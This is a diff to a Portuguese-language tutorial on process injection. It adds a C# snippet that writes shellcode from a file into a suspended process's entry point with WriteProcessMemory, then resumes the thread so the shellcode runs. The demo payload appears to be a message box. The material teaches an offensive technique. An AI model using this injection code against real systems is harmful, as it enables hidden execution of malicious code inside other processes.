@@ -279,6 +279,21 @@ Por último, antes de escrevermos nosso shellcode, precisamos do endereço compl
 IntPtr EntrypointAddressPtr = (IntPtr)((UInt64)ImageAddress + entrypointRVA);
 ```
 
-## WriteProcessMemory
+## WriteProcessMemory e ResumeThread
 
 Agora, após todos esses passos, temos a região de memória onde queremos sobrescrever nosso shellcode. 
+
+```csharp
+byte[] buf = File.ReadAllBytes("msgbox64.bin"); // shellcode
+bool writeMemBool = WriteProcessMemory(
+	pi.hProcess, // handle do processo
+	EntrypointAddressPtr, // VA do EP
+	buf, // shellcode
+	buf.Length, // tamanho do shellcode
+	out IntPtr bytesWritten // quantos bytes foram escritos
+);
+
+if (writeMemBool == true) ResumeThread(pi.hThread);
+```
+
+Caso a escrita na região de memória que anteriormente era o EntryPoint, ao retomarmos a execução do processo anteriormente suspenso, o nosso shellcode será executado.
